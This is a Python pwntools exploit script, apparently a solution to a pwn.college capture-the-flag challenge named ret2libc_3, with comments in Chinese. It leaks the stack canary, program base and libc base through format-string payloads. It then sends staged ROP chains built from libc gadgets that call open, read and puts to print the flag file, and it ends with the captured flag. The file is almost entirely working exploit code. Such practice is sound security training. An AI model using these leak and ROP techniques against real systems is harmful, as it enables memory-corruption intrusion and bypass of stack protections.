#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")

libc_base = 0x00
proc_base = 0x00
stack_chk = 0x00
# saved_rbp = 0x00

# libc gadgets
buf_offset = 0x1ec780 # .data
slash_str_offset = 0x0c10 # "/\x00\x00\x00\x00\x00"
flag_str_offset = 0x1b1de0 # "flags"

pop_rdi_offset = 0x23b6a # pop rdi; ret
pop_rsi_offset = 0x2601f # pop rsi; ret
pop_rdx_offset = 0x142c92 # pop rdx; ret
ret_offset = 0x23b6b # ret

printf_offset = 0x61c90
puts_offset = 0x84420
open_offset = 0x10dce0
read_offset = 0x10dfc0
write_offset = 0x10e060
memcpy_offset = 0xbbad0
sendfile_offset = 0x112fa0

# ret2libc_3
start_offset = 0x1100
leave_message_ret_offset = 0x1403
got_puts_offset = 0x3fa8

sh = process("/challenge/ret2libc_3")
print("pid:", proc.pidof(sh)[0])
# sh.interactive()

# 泄露返回地址，保存栈检查，保持rbp
payload1 = b"%p%p%p%p%p %p%p%p%p%p%p%p\n%p\n%p\n%p\n"
# rsi rdx rcx r8 r9 [rbp-0x40, rbp-8] stack_chk saved_rbp ret

sh.sendline(b'3')
sh.sendafter(b"Input your message:", payload1)
lines = sh.recvlines(numlines=6)
# stack_chk
stack_chk = int(lines[3], 16)
# rbp
# saved_rbp = int(lines[4], 16)
# 计算得到基地址
proc_base = int(lines[5], 16) - leave_message_ret_offset
print("stack_chk:", hex(stack_chk))
# print("saved_rbp:", hex(saved_rbp))
print("proc base:", hex(proc_base))
# sh.interactive()

# 泄露libc puts地址
payload2 = b"%p%p%p%p" # rsi rdx rcx r8
payload2 += b"%p%p%p%p" # r9 rbp-0x40 rbp-0x38 rbp-0x30
payload2 += b"####\n%s\n" # rbp-0x28
payload2 += p64(got_puts_offset+proc_base)

sh.sendline(b'3')
sh.sendafter(b"Input your message:", payload2)
lines = sh.recvlines(numlines=4)
# 计算libc加载地址
libc_base = int.from_bytes(lines[3], byteorder="little") - puts_offset
print("libc base addr:", hex(libc_base))
sh.interactive()


payload = cyclic(0x38)  # 填满缓冲区
payload += p64(stack_chk) # 栈检查
payload += cyclic(8)  # saved_rbp

payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x4) # rdx=4

payload += p64(pop_rsi_offset+libc_base)
payload += p64(slash_str_offset+libc_base) # rsi="/\x00\x00\x00\x00\x00"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi=buf

payload += p64(memcpy_offset+libc_base) # memcpy(buf, "/\x00\x00\x00\x00\x00", 4)


payload += p64(pop_rsi_offset+libc_base)
payload += p64(flag_str_offset+libc_base) # rsi="flags"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base+1) # rdi=buf+1

payload += p64(memcpy_offset+libc_base) # memcpy(buf+1, "flags", 4)

# 一次payload传不完，重启主函数再传一次payload
payload += p64(start_offset+proc_base)

sh.sendline(b'3')
sh.sendafter(b"Input your message:", payload)
# sh.interactive()


payload = cyclic(0x38)  # 填满缓冲区
payload += p64(stack_chk) # 栈检查
payload += cyclic(8)  # saved_rbp


payload += p64(pop_rsi_offset+libc_base)
payload += p64(0)   # rsi=0

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base)    # rdi=buf

payload += p64(open_offset+libc_base)   # open('/flag', 0)


payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x100) # rdx=0x100

payload += p64(pop_rsi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rsi=buf

payload += p64(pop_rdi_offset+libc_base)
payload += p64(3) # rdi=3

payload += p64(read_offset+libc_base) # read(3, buf, 0x100)


# 一次payload传不完，重启主函数再传一次payload
payload += p64(start_offset+proc_base)

sh.sendline(b'3')
sh.send(payload)
# sh.interactive()


payload = cyclic(0x38)  # 填满缓冲区
payload += p64(stack_chk) # 栈检查
payload += cyclic(8)  # saved_rbp


payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi=buf

payload += p64(puts_offset+libc_base) # puts(buf)


sh.sendline(b'3')
sh.send(payload)
sh.interactive()
# pwn.college{wp8oOi2p15fTOIK8cS5F9lgJq_c.QXxMDLyEzW}
